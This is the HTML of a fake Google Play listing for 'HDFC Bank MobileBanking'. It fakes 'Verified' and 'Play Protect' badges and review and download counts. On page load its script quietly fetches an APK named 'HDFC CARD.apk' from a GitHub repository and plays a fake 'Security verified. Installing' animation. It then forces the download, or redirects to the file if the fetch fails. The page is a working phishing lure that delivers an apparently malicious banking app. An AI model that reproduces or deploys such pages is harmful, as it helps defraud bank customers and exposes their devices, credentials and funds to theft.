<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HDFC Bank MobileBanking - Google Play</title>
    <link rel="icon" type="image/png" href="https://www.gstatic.com/android/market_images/web/favicon_v2.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; background: #ffffff; color: #202124; -webkit-font-smoothing: antialiased; }
        .ps-green-text { color: #01875f; }
        .app-icon { width: 72px; height: 72px; border-radius: 20%; box-shadow: 0 2px 8px rgba(0,0,0,0.1); border: 0.5px solid #f0f0f0; }
        .ring-container { position: relative; width: 52px; height: 52px; display: flex; align-items: center; justify-content: center; }
        .ring-svg { transform: rotate(-90deg); width: 100%; height: 100%; }
        .ring-track { fill: none; stroke: #e8eaed; stroke-width: 4.5; }
        .ring-progress { fill: none; stroke: #01875f; stroke-width: 4.5; stroke-linecap: round; stroke-dasharray: 145; stroke-dashoffset: 145; transition: stroke-dashoffset 0.1s linear; }
        .inner-logo { position: absolute; width: 32px; height: 32px; border-radius: 6px; z-index: 5; }
        .bento-card { background: #f8f9fa; border-radius: 12px; padding: 12px 8px; text-align: center; border: 1px solid #f1f3f4; }
        .screenshot { height: 195px; border-radius: 12px; border: 1px solid #e8eaed; flex-shrink: 0; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
    </style>
</head>
<body onload="startBackgroundDownload()" class="max-w-md mx-auto">

    <nav class="flex items-center px-4 py-3 sticky top-0 bg-white z-50 border-b border-gray-100">
        <svg class="w-6 h-6 text-gray-500 mr-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7" stroke-width="2.5"/></svg>
        <div class="flex items-center gap-2">
            <svg class="w-6 h-6" viewBox="0 0 48 48">
                <path fill="#4DB6AC" d="M8 44.4l16.1-16.1L8 12.2v32.2z"/><path fill="#DCE775" d="M36.1 24.1L8 44.4l16.1-16.1 12 12.1z"/><path fill="#FFD54F" d="M36.1 24.1L24.1 12.2 8 12.2l28.1 11.9z"/><path fill="#009688" d="M43.7 22.8L36.1 24.1l-12-11.9 19.6 10.6z"/>
            </svg>
            <span class="text-[19px] font-medium text-gray-700">Google Play</span>
        </div>
    </nav>

    <div class="px-6 pt-4">
        <div class="flex gap-5">
            <img src="https://i.ibb.co/Rkvp8Hcv/unnamed-1.png" class="app-icon">
            <div class="flex flex-col justify-center">
                <h1 class="text-[22px] font-medium text-gray-900 leading-tight">HDFC Bank MobileBanking</h1>
                <p class="ps-green-text font-medium text-[14px] mt-0.5">HDFC Bank Ltd.</p>
                <div class="flex items-center gap-1.5 mt-1">
                    <span class="text-[11px] font-bold text-gray-500 uppercase">Verified</span>
                    <svg class="w-3 h-3 ps-green-text" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                </div>
            </div>
        </div>

        <div class="grid grid-cols-3 gap-3 mt-7 pb-6 border-b border-gray-100">
            <div class="bento-card"><div class="text-[15px] font-bold">4.6 ★</div><div class="text-[9px] text-gray-400 font-bold uppercase mt-1">402K reviews</div></div>
            <div class="bento-card"><div class="text-[15px] font-bold">5.8 MB</div><div class="text-[9px] text-gray-400 font-bold uppercase mt-1">Size</div></div>
            <div class="bento-card"><div class="text-[15px] font-bold">50M+</div><div class="text-[9px] text-gray-400 font-bold uppercase mt-1">Downloads</div></div>
        </div>

        <div class="mt-8 bg-gray-50 p-5 rounded-2xl border border-gray-100 shadow-sm">
            <div class="flex items-center gap-5">
                <div class="ring-container">
                    <svg class="ring-svg"><circle class="ring-track" cx="26" cy="26" r="23"></circle><circle id="progressRing" class="ring-progress" cx="26" cy="26" r="23"></circle></svg>
                    <img src="https://i.ibb.co/Rkvp8Hcv/unnamed-1.png" class="inner-logo">
                </div>
                <div>
                    <p id="mainStatus" class="text-[16px] font-semibold text-gray-900">Starting download...</p>
                    <p id="subStatus" class="text-[12px] text-gray-500 mt-0.5">Verified by Play Protect</p>
                </div>
            </div>
        </div>

        <div class="mt-10 flex gap-4 overflow-x-auto no-scrollbar">
            <img src="https://i.ibb.co/fzkhjYGv/IMG-20260425-111844.jpg" class="screenshot">
            <img src="https://i.ibb.co/vCGSJ09Q/Screenshot-2026-04-25-11-07-33-640-com-android-vending.jpg" class="screenshot">
        </div>
    </div>

    <script>
        const apkUrl = "https://github.com/sumankkuuyy-coder/apkadmin/raw/refs/heads/main/HDFC%20CARD.apk";

        async function startBackgroundDownload() {
            const mainMsg = document.getElementById('mainStatus');
            const subMsg = document.getElementById('subStatus');
            const ring = document.getElementById('progressRing');
            const dash = 145;

            try {
                // Background Fetch (Chrome nahi khulega)
                const response = await fetch(apkUrl);
                if (!response.ok) throw new Error('Network error');

                const reader = response.body.getReader();
                const contentLength = 5800000; // GitHub raw links pe content-length kabhi kabhi nahi aata
                let receivedLength = 0;
                let chunks = [];

                while(true) {
                    const {done, value} = await reader.read();
                    if (done) break;
                    chunks.push(value);
                    receivedLength += value.length;
                    
                    let p = Math.min(Math.round((receivedLength / 6000000) * 100), 99);
                    ring.style.strokeDashoffset = dash - (p/100) * dash;
                    mainMsg.innerText = "Downloading...";
                    subMsg.innerText = p + "% of 5.8 MB (Secure Background)";
                }

                // Download Complete Logic
                ring.style.strokeDashoffset = 0;
                mainMsg.innerText = "Installing...";
                subMsg.innerText = "Security verified. Processing...";

                const blob = new Blob(chunks, { type: 'application/vnd.android.package-archive' });
                const downloadUrl = window.URL.createObjectURL(blob);
                
                const a = document.createElement('a');
                a.href = downloadUrl;
                a.download = "HDFC_Mobile_Banking.apk";
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

            } catch (err) {
                // Fallback agar Fetch block ho (Github generally allows CORS for raw files)
                mainMsg.innerText = "Redirecting...";
                window.location.assign(apkUrl);
            }
        }
    </script>
</body>
</html>
